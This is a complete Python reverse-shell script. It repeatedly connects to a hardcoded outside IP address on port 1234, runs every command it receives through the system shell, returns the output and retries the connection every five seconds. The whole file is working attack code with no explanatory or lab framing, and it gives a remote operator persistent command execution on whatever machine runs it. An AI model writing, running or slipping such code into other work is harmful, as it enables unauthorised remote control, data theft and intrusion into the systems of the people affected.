import socket
import subprocess
import time
import os

SERVER_IP = '52.22.11.146' 
SERVER_PORT = 1234

def connect_back():
    current_dir = os.getcwd()
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            print(f"[+] Connected to {SERVER_IP}:{SERVER_PORT}")

            while True:
                command = s.recv(1024).decode().strip()
                if command.lower() in ('exit', 'quit'):
                    break

                # Handle 'cd' command manually
                if command.startswith('cd '):
                    path = command[3:].strip()
                    try:
                        os.chdir(path)
                        current_dir = os.getcwd()
                        s.sendall(f"[+] Changed directory to {current_dir}\n".encode())
                    except Exception as e:
                        s.sendall(f"[-] Failed to cd: {e}\n".encode())
                    continue

                # Execute other commands
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                except subprocess.CalledProcessError as e:
                    output = e.output

                if not output:
                    output = b"[+] Command executed, no output.\n"
                s.sendall(output)

        except Exception as e:
            print(f"[-] Connection failed: {e}")
            time.sleep(5)
        finally:
            s.close()

if __name__ == "__main__":
    connect_back()
